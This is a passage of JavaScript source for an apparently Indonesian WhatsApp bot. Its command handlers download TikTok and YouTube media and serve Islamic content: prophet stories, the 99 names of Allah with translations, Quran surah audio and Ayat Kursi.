      title: convert.title,
      mediaType: 1,
      previewType: 1,
      body: convert.author.name,
      //previewType: "PHOTO",
      thumbnailUrl: convert.thumbnail,
      renderLargerThumbnail: true,
      mediaUrl: convert.url,
      sourceUrl: convert.url
   },
    forwardedNewsletterMessageInfo: {
     newsletterJid: saluran,
     serverMessageId: -1,
     newsletterName: `Yt Downloader By: ${ownername}`,
    }
  }
};
await Yuta.sendMessage(m.chat, leo, { quoted: fnews });

await downloadMp4(convert.url)
}
break

case 'tiktok': case 'tt': case 'tiktokvideo': case 'ttvideo': {  
if (!users.registered) return IsReg() 
if (!text.includes('tiktok.com')) return replygcyuta(`• *Example :* .${command} hhttps://vt.tiktok.com/xxxxxxx/`)
const { tiktok, tiktok2, dlv3, dlv4, dlv5 } = require('./lib/tiktoktop')
let hasil = await dlv5(text)
let leocap = `┏⪻── *[ ᴅ ᴏ ᴡ ɴ ʟ ᴏ ᴀ ᴅ ᴇ ʀ - ᴛ ᴛ ]* ──⪼┓\n`
leocap += `〆 ᴛɪᴛʟᴇ : ${hasil.title}\n`
leocap += `〆 ʟɪᴋᴇ : ${hasil.stats.likes}\n`
leocap += `〆 ᴋᴏᴍᴇɴᴛᴀʀ : ${hasil.stats.comment}\n`
leocap += `〆 ʙᴀɢɪᴋᴀɴ : ${hasil.stats.share}\n`
leocap += `〆 ᴠɪᴇᴡᴇʀ𝘴 : ${hasil.stats.views}\n`
leocap += `〆 ᴛᴀɴɢɢᴀʟ ᴜᴘʟᴏᴀᴅ : ${hasil.at}\n`
leocap += `〆 ᴀᴜᴛʜᴏʀ : ${hasil.author.nickname}\n`
leocap += `〆 ᴀᴜᴛʜᴏʀ_ɴɪᴄᴋ : ${hasil.author.fullname}\n`
leocap += `〆 ғᴜʟʟɴᴀᴍᴇ : ${hasil.duration}\n`
leocap += `〆 ʀᴇɢɪᴏɴ : ${hasil.region}\n`
leocap += `〆 ᴜʀʟ : ${text}\n`
leocap += `┗⪻─────────────────────────⪼┛`
sendReaction('✅');

try {
const res = await tiktok2(text)
let buttonnya = [{
name: 'cta_url',
buttonParamsJson: {
display_text: 'Video Url Tiktok',
url: text,
 merchant_url: text
}
}]
 let a = await Yuta.sendButtonVid(m.chat, leocap, botname, null, res.no_watermark, buttonnya, fnews, saluran, `TiktokDl By: ${ownername}`);
await Yuta.sendMessage(m.chat, { audio: { url: res.music }, fileName: `tiktok.mp3`, mimetype: 'audio/mp4'}, { quoted:fnews })
} catch (err) {
try {
let buttonnya = [{
name: 'cta_url',
buttonParamsJson: {
display_text: 'Video Url Tiktok',
url: text,
 merchant_url: text
}
}]
 let a = await Yuta.sendButtonVid(m.chat, leocap, botname, null, hasil.data[1].url, buttonnya, fnews, saluran, `TiktokDl By: ${ownername}`);
await Yuta.sendMessage(m.chat, { audio: { url: hasil.music_info.url }, fileName: `tiktok.mp3`, mimetype: 'audio/mp4'}, { quoted:fnews })
} catch (err) {
 sendReaction('❌');
}}
if (limituser < 1) return limitAbis();
useLimit(1)
}
break

case 'kisahnabi': {
     if (!text) return replygcyuta(`Masukan nama nabi\nExample: kisahnabi adam`)
     let url = await fetch(`https://raw.githubusercontent.com/ZeroChanBot/Api-Freee/a9da6483809a1fbf164cdf1dfbfc6a17f2814577/data/kisahNabi/${text}.json`)
     let kisah = await url.json().catch(_ => "Error")
     if (kisah == "Error") return replygcyuta("*Not Found*\n*📮 ᴛɪᴘs :* coba jangan gunakan huruf capital")
     
    let hasil = `_*👳 Nabi :*_ ${kisah.name}
_*📅 Tanggal Lahir :*_ ${kisah.thn_kelahiran}
_*📍 Tempat Lahir :*_ ${kisah.tmp}
_*📊 Usia :*_ ${kisah.usia}

*— — — — — — — [ K I S A H ] — — — — — — —*

${kisah.description}`

     replygcyuta(`${hasil}`)

}
break
//=========================================\\
const contoh = `*Asmaul Husna*
`
// data here
const anjuran = `
Dari Abu hurarirah radhiallahu anhu, Rasulullah Saw bersabda: "إِنَّ لِلَّهِ تَعَالَى تِسْعَةً وَتِسْعِينَ اسْمًا، مِائَةٌ إِلَّا وَاحِدًا، مَنْ أَحْصَاهَا دخل الجنة، وهو وتر يُحِبُّ الْوِتْرَ"
Artinya: "Sesungguhnya Allah mempunyai sembilan puluh sembilan nama, alias seratus kurang satu. Barang siapa yang menghitung-hitungnya, niscaya masuk surga; Dia Witir dan menyukai yang witir".`

case 'asmaulhusna': {
const asmaulhusna = [
    {
        index: 1,
        latin: "Ar Rahman",
        arabic: "الرَّحْمَنُ",
        translation_id: "Yang Memiliki Mutlak sifat Pemurah",
        translation_en: "The All Beneficent"
    },
    {
        index: 2,
        latin: "Ar Rahiim",
        arabic: "الرَّحِيمُ",
        translation_id: "Yang Memiliki Mutlak sifat Penyayang",
        translation_en: "The Most Merciful"
    },
    {
        index: 3,
        latin: "Al Malik",
        arabic: "الْمَلِكُ",
        translation_id: "Yang Memiliki Mutlak sifat Merajai/Memerintah",
        translation_en: "The King, The Sovereign"
    },
    {
        index: 4,
        latin: "Al Quddus",
        arabic: "الْقُدُّوسُ",
        translation_id: "Yang Memiliki Mutlak sifat Suci",
        translation_en: "The Most Holy"
    },
    {
        index: 5,
        latin: "As Salaam",
        arabic: "السَّلاَمُ",
        translation_id: "Yang Memiliki Mutlak sifat Memberi Kesejahteraan",
        translation_en: "Peace and Blessing"
    },
    {
        index: 6,
        latin: "Al Mu’min",
        arabic: "الْمُؤْمِنُ",
        translation_id: "Yang Memiliki Mutlak sifat Memberi Keamanan",
        translation_en: "The Guarantor"
    },
    {
        index: 7,
        latin: "Al Muhaimin",
        arabic: "الْمُهَيْمِنُ",
        translation_id: "Yang Memiliki Mutlak sifat Pemelihara",
        translation_en: "The Guardian, the Preserver"
    },
    {
        index: 8,
        latin: "Al ‘Aziiz",
        arabic: "الْعَزِيزُ",
        translation_id: "Yang Memiliki Mutlak Kegagahan",
        translation_en: "The Almighty, the Self Sufficient"
    },
    {
        index: 9,
        latin: "Al Jabbar",
        arabic: "الْجَبَّارُ",
        translation_id: "Yang Memiliki Mutlak sifat Perkasa",
        translation_en: "The Powerful, the Irresistible"
    },
    {
        index: 10,
        latin: "Al Mutakabbir",
        arabic: "الْمُتَكَبِّرُ",
        translation_id: "Yang Memiliki Mutlak sifat Megah,Yang Memiliki Kebesaran",
        translation_en: "The Tremendous"
    },
    {
        index: 11,
        latin: "Al Khaliq",
        arabic: "الْخَالِقُ",
        translation_id: "Yang Memiliki Mutlak sifat Pencipta",
        translation_en: "The Creator"
    },
    {
        index: 12,
        latin: "Al Baari’",
        arabic: "الْبَارِئُ",
        translation_id: "Yang Memiliki Mutlak sifat Yang Melepaskan(Membuat, Membentuk, Menyeimbangkan)",
        translation_en: "The Maker"
    },
    {
        index: 13,
        latin: "Al Mushawwir",
        arabic: "الْمُصَوِّرُ",
        translation_id: "Yang Memiliki Mutlak sifat YangMembentuk Rupa (makhluknya)",
        translation_en: "The Fashioner of Forms"
    },
    {
        index: 14,
        latin: "Al Ghaffaar",
        arabic: "الْغَفَّارُ",
        translation_id: "Yang Memiliki Mutlak sifat Pengampun",
        translation_en: "The Ever Forgiving"
    },
    {
        index: 15,
        latin: "Al Qahhaar",
        arabic: "الْقَهَّارُ",
        translation_id: "Yang Memiliki Mutlak sifat Memaksa",
        translation_en: "The All Compelling Subduer"
    },
    {
        index: 16,
        latin: "Al Wahhaab",
        arabic: "الْوَهَّابُ",
        translation_id: "Yang Memiliki Mutlak sifat Pemberi Karunia",
        translation_en: "The Bestower"
    },
    {
        index: 17,
        latin: "Ar Razzaaq",
        arabic: "الرَّزَّاقُ",
        translation_id: "Yang Memiliki Mutlak sifat Pemberi Rejeki",
        translation_en: "The Ever Providing"
    },
    {
        index: 18,
        latin: "Al Fattaah",
        arabic: "الْفَتَّاحُ",
        translation_id: "Yang Memiliki Mutlak sifat Pembuka Rahmat",
        translation_en: "The Opener, the Victory Giver"
    },
    {
        index: 19,
        latin: "Al ‘Aliim",
        arabic: "اَلْعَلِيْمُ",
        translation_id: "Yang Memiliki Mutlak sifatMengetahui (Memiliki Ilmu)",
        translation_en: "The All Knowing, the Omniscient"
    },
    {
        index: 20,
        latin: "Al Qaabidh",
        arabic: "الْقَابِضُ",
        translation_id: "Yang Memiliki Mutlak sifat YangMenyempitkan (makhluknya)",
        translation_en: "The Restrainer, the Straightener"
    },
    {
        index: 21,
        latin: "Al Baasith",
        arabic: "الْبَاسِطُ",
        translation_id: "Yang Memiliki Mutlak sifat YangMelapangkan (makhluknya)",
        translation_en: "The Expander, the Munificent"
    },
    {
        index: 22,
        latin: "Al Khaafidh",
        arabic: "الْخَافِضُ",
        translation_id: "Yang Memiliki Mutlak sifat YangMerendahkan (makhluknya)",
        translation_en: "The Abaser"
    },
    {
        index: 23,
        latin: "Ar Raafi’",
        arabic: "الرَّافِعُ",
        translation_id: "Yang Memiliki Mutlak sifat YangMeninggikan (makhluknya)",
        translation_en: "The Exalter"
    },
    {
        index: 24,
        latin: "Al Mu’izz",
        arabic: "الْمُعِزُّ",
        translation_id: "Yang Memiliki Mutlak sifat YangMemuliakan (makhluknya)",
        translation_en: "The Giver of Honor"
    },
    {
        index: 25,
        latin: "Al Mudzil",
        arabic: "المُذِلُّ",
        translation_id: "Yang Memiliki Mutlak sifatYang Menghinakan (makhluknya)",
        translation_en: "The Giver of Dishonor"
    },
    {
        index: 26,
        latin: "Al Samii’",
        arabic: "السَّمِيعُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Mendengar",
        translation_en: "The All Hearing"
    },
    {
        index: 27,
        latin: "Al Bashiir",
        arabic: "الْبَصِيرُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Melihat",
        translation_en: "The All Seeing"
    },
    {
        index: 28,
        latin: "Al Hakam",
        arabic: "الْحَكَمُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Menetapkan",
        translation_en: "The Judge, the Arbitrator"
    },
    {
        index: 29,
        latin: "Al ‘Adl",
        arabic: "الْعَدْلُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Adil",
        translation_en: "The Utterly Just"
    },
    {
        index: 30,
        latin: "Al Lathiif",
        arabic: "اللَّطِيفُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Lembut",
        translation_en: "The Subtly Kind"
    },
    {
        index: 31,
        latin: "Al Khabiir",
        arabic: "الْخَبِيرُ",
        translation_id: "Yang Memiliki Mutlak sifatMaha Mengetahui Rahasia",
        translation_en: "The All Aware"
    },
    {
        index: 32,
        latin: "Al Haliim",
        arabic: "الْحَلِيمُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Penyantun",
        translation_en: "The Forbearing, the Indulgent"
    },
    {
        index: 33,
        latin: "Al ‘Azhiim",
        arabic: "الْعَظِيمُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Agung",
        translation_en: "The Magnificent, the Infinite"
    },
    {
        index: 34,
        latin: "Al Ghafuur",
        arabic: "الْغَفُورُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Pengampun",
        translation_en: "The All Forgiving"
    },
    {
        index: 35,
        latin: "As Syakuur",
        arabic: "الشَّكُورُ",
        translation_id: "Yang Memiliki Mutlak sifat MahaPembalas Budi (Menghargai)",
        translation_en: "The Grateful"
    },
    {
        index: 36,
        latin: "Al ‘Aliy",
        arabic: "الْعَلِيُّ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Tinggi",
        translation_en: "The Sublimely Exalted"
    },
    {
        index: 37,
        latin: "Al Kabiir",
        arabic: "الْكَبِيرُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Besar",
        translation_en: "The Great"
    },
    {
        index: 38,
        latin: "Al Hafizh",
        arabic: "الْحَفِيظُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Menjaga",
        translation_en: "The Preserver"
    },
    {
        index: 39,
        latin: "Al Muqiit",
        arabic: "المُقيِت",
        translation_id: "Yang Memiliki Mutlak sifat Maha Pemberi Kecukupan",
        translation_en: "The Nourisher"
    },
    {
        index: 40,
        latin: "Al Hasiib",
        arabic: "الْحسِيبُ",
        translation_id: "Yang Memiliki Mutlak sifat MahaMembuat Perhitungan",
        translation_en: "The Reckoner"
    },
    {
        index: 41,
        latin: "Al Jaliil",
        arabic: "الْجَلِيلُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Mulia",
        translation_en: "The Majestic"
    },
    {
        index: 42,
        latin: "Al Kariim",
        arabic: "الْكَرِيمُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Pemurah",
        translation_en: "The Bountiful, the Generous"
    },
    {
        index: 43,
        latin: "Ar Raqiib",
        arabic: "الرَّقِيبُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Mengawasi",
        translation_en: "The Watchful"
    },
    {
        index: 44,
        latin: "Al Mujiib",
        arabic: "الْمُجِيبُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Mengabulkan",
        translation_en: "The Responsive, the Answerer"
    },
    {
        index: 45,
        latin: "Al Waasi’",
        arabic: "الْوَاسِعُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Luas",
        translation_en: "The Vast, the All Encompassing"
    },
    {
        index: 46,
        latin: "Al Hakiim",
        arabic: "الْحَكِيمُ",
        translation_id: "Yang Memiliki Mutlak sifat Maka Bijaksana",
        translation_en: "The Wise"
    },
    {
        index: 47,
        latin: "Al Waduud",
        arabic: "الْوَدُودُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Pencinta",
        translation_en: "The Loving, the Kind One"
    },
    {
        index: 48,
        latin: "Al Majiid",
        arabic: "الْمَجِيدُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Mulia",
        translation_en: "The All Glorious"
    },
    {
        index: 49,
        latin: "Al Baa’its",
        arabic: "الْبَاعِثُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Membangkitkan",
        translation_en: "The Raiser of the Dead"
    },
    {
        index: 50,
        latin: "As Syahiid",
        arabic: "الشَّهِيدُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Menyaksikan",
        translation_en: "The Witness"
    },
    {
        index: 51,
        latin: "Al Haqq",
        arabic: "الْحَقُّ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Benar",
        translation_en: "The Truth, the Real"
    },
    {
        index: 52,
        latin: "Al Wakiil",
        arabic: "الْوَكِيلُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Memelihara",
        translation_en: "The Trustee, the Dependable"
    },
    {
        index: 53,
        latin: "Al Qawiyyu",
        arabic: "الْقَوِيُّ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Kuat",
        translation_en: "The Strong"
    },
    {
        index: 54,
        latin: "Al Matiin",
        arabic: "الْمَتِينُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Kokoh",
        translation_en: "The Firm, the Steadfast"
    },
    {
        index: 55,
        latin: "Al Waliyy",
        arabic: "الْوَلِيُّ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Melindungi",
        translation_en: "The Protecting Friend, Patron, and Helper"
    },
    {
        index: 56,
        latin: "Al Hamiid",
        arabic: "الْحَمِيدُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Terpuji",
        translation_en: "The All Praiseworthy"
    },
    {
        index: 57,
        latin: "Al Mushii",
        arabic: "الْمُحْصِي",
        translation_id: "Yang Memiliki Mutlak sifat Maha Mengkalkulasi",
        translation_en: "The Accounter, the Numberer of All"
    },
    {
        index: 58,
        latin: "Al Mubdi’",
        arabic: "الْمُبْدِئُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Memulai",
        translation_en: "The Producer, Originator, and Initiator of all"
    },
    {
        index: 59,
        latin: "Al Mu’iid",
        arabic: "الْمُعِيدُ",
        translation_id: "Yang Memiliki Mutlak sifat MahaMengembalikan Kehidupan",
        translation_en: "The Reinstater Who Brings Back All"
    },
    {
        index: 60,
        latin: "Al Muhyii",
        arabic: "الْمُحْيِي",
        translation_id: "Yang Memiliki Mutlak sifat Maha Menghidupkan",
        translation_en: "The Giver of Life"
    },
    {
        index: 61,
        latin: "Al Mumiitu",
        arabic: "اَلْمُمِيتُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Mematikan",
        translation_en: "The Bringer of Death, the Destroyer"
    },
    {
        index: 62,
        latin: "Al Hayyu",
        arabic: "الْحَيُّ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Hidup",
        translation_en: "The Ever Living"
    },
    {
        index: 63,
        latin: "Al Qayyuum",
        arabic: "الْقَيُّومُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Mandiri",
        translation_en: "The Self Subsisting Sustainer of All"
    },
    {
        index: 64,
        latin: "Al Waajid",
        arabic: "الْوَاجِدُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Penemu",
        translation_en: "The Perceiver, the Finder, the Unfailing"
    },
    {
        index: 65,
        latin: "Al Maajid",
        arabic: "الْمَاجِدُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Mulia",
        translation_en: "The Illustrious, the Magnificent"
    },
    {
        index: 66,
        latin: "Al Wahiid",
        arabic: "الْواحِدُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Tunggal",
        translation_en: "The One, The Unique, Manifestation of Unity"
    },
    {
        index: 67,
        latin: "Al ‘Ahad",
        arabic: "اَلاَحَدُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Esa",
        translation_en: "The One, the All Inclusive, the Indivisible"
    },
    {
        index: 68,
        latin: "As Shamad",
        arabic: "الصَّمَدُ",
        translation_id: "Yang Memiliki Mutlak sifat MahaDibutuhkan, Tempat Meminta",
        translation_en: "The Self Sufficient, the Impregnable,the Eternally Besought of All, the Everlasting"
    },
    {
        index: 69,
        latin: "Al Qaadir",
        arabic: "الْقَادِرُ",
        translation_id: "Yang Memiliki Mutlak sifat MahaMenentukan, Maha Menyeimbangkan",
        translation_en: "The All Able"
    },
    {
        index: 70,
        latin: "Al Muqtadir",
        arabic: "الْمُقْتَدِرُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Berkuasa",
        translation_en: "The All Determiner, the Dominant"
    },
    {
        index: 71,
        latin: "Al Muqaddim",
        arabic: "الْمُقَدِّمُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Mendahulukan",
        translation_en: "The Expediter, He who brings forward"
    },
    {
        index: 72,
        latin: "Al Mu’akkhir",
        arabic: "الْمُؤَخِّرُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Mengakhirkan",
        translation_en: "The Delayer, He who puts far away"
    },
    {
        index: 73,
        latin: "Al Awwal",
        arabic: "الأوَّلُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Awal",
        translation_en: "The First"
    },
    {
        index: 74,
        latin: "Al Aakhir",
        arabic: "الآخِرُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Akhir",
        translation_en: "The Last"
    },
    {
        index: 75,
        latin: "Az Zhaahir",
        arabic: "الظَّاهِرُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Nyata",
        translation_en: "The Manifest; the All Victorious"
    },
    {
        index: 76,
        latin: "Al Baathin",
        arabic: "الْبَاطِنُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Ghaib",
        translation_en: "The Hidden; the All Encompassing"
    },
    {
        index: 77,
        latin: "Al Waali",
        arabic: "الْوَالِي",
        translation_id: "Yang Memiliki Mutlak sifat Maha Memerintah",
        translation_en: "The Patron"
    },
    {
        index: 78,
        latin: "Al Muta’aalii",
        arabic: "الْمُتَعَالِي",
        translation_id: "Yang Memiliki Mutlak sifat Maha Tinggi",
        translation_en: "The Self Exalted"
    },
    {
        index: 79,
        latin: "Al Barri",
        arabic: "الْبَرُّ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Penderma",
        translation_en: "The Most Kind and Righteous"
    },
    {
        index: 80,
        latin: "At Tawwaab",
        arabic: "التَّوَابُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Penerima Tobat",
        translation_en: "The Ever Returning, Ever Relenting"
    },
    {
        index: 81,
        latin: "Al Muntaqim",
        arabic: "الْمُنْتَقِمُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Penuntut Balas",
        translation_en: "The Avenger"
    },
    {
        index: 82,
        latin: "Al Afuww",
        arabic: "العَفُوُّ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Pemaaf",
        translation_en: "The Pardoner, the Effacer of Sins"
    },
    {
        index: 83,
        latin: "Ar Ra`uuf",
        arabic: "الرَّؤُوفُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Pengasih",
        translation_en: "The Compassionate, the All Pitying"
    },
    {
        index: 84,
        latin: "Malikul Mulk",
        arabic: "مَالِكُ الْمُلْكِ",
        translation_id: "Yang Memiliki Mutlak sifatPenguasa Kerajaan (Semesta)",
        translation_en: "The Owner of All Sovereignty"
    },
    {
        index: 85,
        latin: "Dzul JalaaliWal Ikraam",
        arabic: "ذُوالْجَلاَلِوَالإكْرَامِ",
        translation_id: "Yang Memiliki Mutlak sifat PemilikKebesaran dan Kemuliaan",
        translation_en: "The Lord of Majesty and Generosity"
    },
    {
        index: 86,
        latin: "Al Muqsith",
        arabic: "الْمُقْسِطُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Adil",
        translation_en: "The Equitable, the Requiter"
    },
    {
        index: 87,
        latin: "Al Jamii’",
        arabic: "الْجَامِعُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Mengumpulkan",
        translation_en: "The Gatherer, the Unifier"
    },
    {
        index: 88,
        latin: "Al Ghaniyy",
        arabic: "الْغَنِيُّ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Berkecukupan",
        translation_en: "The All Rich, the Independent"
    },
    {
        index: 89,
        latin: "Al Mughnii",
        arabic: "الْمُغْنِي",
        translation_id: "Yang Memiliki Mutlak sifat Maha Memberi Kekayaan",
        translation_en: "The Enricher, the Emancipator"
    },
    {
        index: 90,
        latin: "Al Maani",
        arabic: "اَلْمَانِعُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Mencegah",
        translation_en: "The Withholder, the Shielder, the Defender"
    },
    {
        index: 91,
        latin: "Ad Dhaar",
        arabic: "الضَّارَّ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Memberi Derita",
        translation_en: "The Distressor, the Harmer"
    },
    {
        index: 92,
        latin: "An Nafii’",
        arabic: "النَّافِعُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Memberi Manfaat",
        translation_en: "The Propitious, the Benefactor"
    },
    {
        index: 93,
        latin: "An Nuur",
        arabic: "النُّورُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Bercahaya(Menerangi, Memberi Cahaya)",
        translation_en: "The Light"
    },
    {
        index: 94,
        latin: "Al Haadii",
        arabic: "الْهَادِي",
        translation_id: "Yang Memiliki Mutlak sifat Maha Pemberi Petunjuk",
        translation_en: "The Guide"
    },
    {
        index: 95,
        latin: "Al Baadii",
        arabic: "الْبَدِيعُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Pencipta",
        translation_en: "Incomparable, the Originator"
    },
    {
        index: 96,
        latin: "Al Baaqii",
        arabic: "اَلْبَاقِي",
        translation_id: "Yang Memiliki Mutlak sifat Maha Kekal",
        translation_en: "The Ever Enduring and Immutable"
    },
    {
        index: 97,
        latin: "Al Waarits",
        arabic: "الْوَارِثُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Pewaris",
        translation_en: "The Heir, the Inheritor of All"
    },
    {
        index: 98,
        latin: "Ar Rasyiid",
        arabic: "الرَّشِيدُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Pandai",
        translation_en: "The Guide, Infallible Teacher, and Knower"
    },
    {
        index: 99,
        latin: "As Shabuur",
        arabic: "الصَّبُورُ",
        translation_id: "Yang Memiliki Mutlak sifat Maha Sabar",
        translation_en: "The Patient"
    }
]
    let json = JSON.parse(JSON.stringify(asmaulhusna))
    let data = json.map((v, i) => `${i + 1}. ${v.latin}\n${v.arabic}\n${v.translation_id}`).join('\n\n')
    if (isNaN(args[0])) return replygcyuta (`contoh:\nasmaulhusna 1`)
    if (args[0]) {
        if (args[0] < 1 || args[0] > 99) throw `minimal 1 & maksimal 99!`
        let { index, latin, arabic, translation_id, translation_en } = json.find(v => v.index == args[0].replace(/[^0-9]/g, ''))
        return replygcyuta(`No. ${index}
${arabic}
${latin}
${translation_id}
${translation_en}
`.trim())
    }
    replygcyuta(`${contoh} + ${data} + ${anjuran}`)
}
break
//=========================================\\
case 'audiosurah': {
	let wrong = `_*Contoh Penggunaan :*_\naudiosurah 1

*List Surah :*
1 : Al-Fatihah
2 : Al-Baqarah
3 : Ali 'Imran
4 : An-Nisa'
5 : Al-Ma'idah
6 : Al-An'am
7 : Al-A’raf
8 : Al-Anfal
9 : At-Taubah
10 : Yunus
11 : Hud
12 : Yusuf
13 : Ar-Ra’d
14 : Ibrahim
15 : Al-Hijr
16 : An-Nahl
17 : Al-Isra'
18 : Al-Kahf
19 : Maryam
20 : Ta Ha
21 : Al-Anbiya
22 : Al-Hajj
23 : Al-Mu’minun
24 : An-Nur
25 : Al-Furqan
26 : Asy-Syu'ara'
27 : An-Naml
28 : Al-Qasas
29 : Al-'Ankabut
30 : Ar-Rum
31 : Luqman
32 : As-Sajdah
33 : Al-Ahzab
34 : Saba’
35 : Fatir
36 : Ya Sin
37 : As-Saffat
38 : Sad
39 : Az-Zumar
40 : Ghafir
41 : Fussilat
42 : Asy-Syura
43 : Az-Zukhruf
44 : Ad-Dukhan
45 : Al-Jasiyah
46 : Al-Ahqaf
47 : Muhammad
48 : Al-Fath
49 : Al-Hujurat
50 : Qaf
51 : Az-Zariyat
52 : At-Tur
53 : An-Najm
54 : Al-Qamar
55 : Ar-Rahman
56 : Al-Waqi’ah
57 : Al-Hadid
58 : Al-Mujadilah
59 : Al-Hasyr
60 : Al-Mumtahanah
61 : As-Saff
62 : Al-Jumu’ah
63 : Al-Munafiqun
64 : At-Tagabun
65 : At-Talaq
66 : At-Tahrim
67 : Al-Mulk
68 : Al-Qalam
69 : Al-Haqqah
70 : Al-Ma’arij
71 : Nuh
72 : Al-Jinn
73 : Al-Muzzammil
74 : Al-Muddassir
75 : Al-Qiyamah
76 : Al-Insan
77 : Al-Mursalat
78 : An-Naba’
79 : An-Nazi’at
80 : 'Abasa
81 : At-Takwir
82 : Al-Infitar
83 : Al-Tatfif
84 : Al-Insyiqaq
85 : Al-Buruj
86 : At-Tariq
87 : Al-A’la
88 : Al-Gasyiyah
89 : Al-Fajr
90 : Al-Balad
91 : Asy-Syams
92 : Al-Lail
93 : Ad-Duha
94 : Al-Insyirah
95 : At-Tin
96 : Al-'Alaq
97 : Al-Qadr
98 : Al-Bayyinah
99 : Az-Zalzalah
100 : Al-'Adiyat
101 : Al-Qari'ah
102 : At-Takasur
103 : Al-'Asr
104 : Al-Humazah
105 : Al-Fil
106 : Quraisy
107 : Al-Ma’un
108 : Al-Kausar
109 : Al-Kafirun
110 : An-Nasr
111 : Al-Lahab
112 : Al-Ikhlas
113 : Al-Falaq
114 : An-Nas`
   if (!text) return replygcyuta(`${wrong}`)
      
replygcyuta(mess.loading)
   Yuta.sendMessage(m.chat, { audio: { url: `https://api.lolhuman.xyz/api/quran/audio/${text}?apikey=Elaina` }, mimetype: 'audio/mp4' }, { quoted: fnews });

}
break
//=========================================\\

case 'ayatkursi': {
  let caption = `
*「 Ayat Kursi 」*
اللَّهُ لَا إِلَهَ إِلَّا هُوَ الْحَيُّ الْقَيُّومُ لَا تَأْخُذُهُ سِنَةٌ وَلَا نَوْمٌ لَهُ مَا فِي السَّمَاوَاتِ وَمَا فِي الْأَرْضِ مَنْ ذَا الَّذِي يَشْفَعُ عِنْدَهُ إِلَّا بِإِذْنِهِ يَعْلَمُ مَا بَيْنَ أَيْدِيهِمْ وَمَا خَلْفَهُمْ وَلَا يُحِيطُونَ بِشَيْءٍ مِنْ عِلْمِهِ إِلَّا بِمَا شَاءَ وَسِعَ كُرْسِيُّهُ السَّمَاوَاتِ وَالْأَرْضَ وَلَا يَئُودُهُ حِفْظُهُمَا وَهُوَ الْعَلِيُّ الْعَظِيمُ
“Alloohu laa ilaaha illaa huwal hayyul qoyyuum, laa ta’khudzuhuu sinatuw walaa naum. Lahuu maa fissamaawaati wa maa fil ardli man dzal ladzii yasyfa’u ‘indahuu illaa biidznih, ya’lamu maa baina aidiihim wamaa kholfahum wa laa yuhiithuuna bisyai’im min ‘ilmihii illaa bimaa syaa’ wasi’a kursiyyuhus samaawaati wal ardlo walaa ya’uuduhuu hifdhuhumaa wahuwal ‘aliyyul ‘adhiim.”
Artinya:
Allah, tidak ada Tuhan (yang berhak disembah) melainkan Dia Yang Hidup kekal lagi terus menerus mengurus (makhluk-Nya); tidak mengantuk dan tidak tidur. Kepunyaan-Nya apa yang di langit dan di bumi. Tiada yang dapat memberi syafa'at di sisi Allah tanpa izin-Nya.
Allah mengetahui apa-apa yang di hadapan mereka dan di belakang mereka, dan mereka tidak mengetahui apa-apa dari ilmu Allah melainkan apa yang dikehendaki-Nya. Kursi Allah meliputi langit dan bumi. Dan Allah tidak merasa berat memelihara keduanya, dan Allah Maha Tinggi lagi Maha Besar." 
(QS. Al Baqarah: 255)
`.trim()
  replygcyuta(caption)
}
break
//=========================================\\
case 'bacaansholat': {
const bacaanshalat = {
  "result": [
    {
      "id": 1,
      "name": "Bacaan Iftitah",
